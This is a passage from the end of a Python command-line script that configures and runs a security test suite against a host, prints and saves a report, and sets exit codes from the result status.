        ws_url=f"ws://{args.host}:{args.port}/ws",
        test_type=args.test_type,
        timeout=args.timeout,
        output_file=args.output,
        report_format=args.format,
        verbose=args.verbose
    )
    
    # Initialize test suite
    test_suite = SecurityTestSuite(config)
    
    # Configure logging
    if args.verbose:
        test_suite.logger.setLevel(logging.DEBUG)
    
    # Run security test
    try:
        print(f"Starting {args.test_type} security test...")
        print(f"Target: {config.base_url}")
        
        report = asyncio.run(test_suite.run_comprehensive_security_test())
        
        # Print summary
        test_suite.print_summary(report)
        
        # Save report
        test_suite.save_report(report)
        
        # Exit with appropriate code based on security status
        exit_code = 0
        if report['test_summary']['overall_status'] in ['CRITICAL', 'FAIL']:
            exit_code = 1
        elif report['test_summary']['overall_status'] == 'WARN':
            exit_code = 2
        
        sys.exit(exit_code)
        
    except KeyboardInterrupt:
        print("\nSecurity test interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\nSecurity test failed: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()